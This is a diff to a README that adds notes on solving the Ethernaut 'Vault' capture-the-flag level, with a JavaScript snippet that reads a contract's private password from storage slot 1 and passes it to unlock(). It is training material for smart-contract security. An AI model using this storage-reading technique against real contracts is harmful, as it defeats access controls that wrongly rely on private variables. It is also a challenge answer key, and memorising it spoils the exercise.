@@ -16,3 +16,17 @@ Scripts have full access to the web3.js and ethers.js libraries.
 To run a script, right click on file name in the file explorer and click 'Run'. Remember, Solidity file must already be compiled.
 
 Output from script will appear in remix terminal.
+
+### Vault
+
+https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188
+
+Was solved using just Javascript with the help of 
+
+https://cmichel.io/ethernaut-solutions/
+
+```
+await contract.unlock( (
+    await web3.eth.getStorageAt(contract.address, 1)
+) );
+```
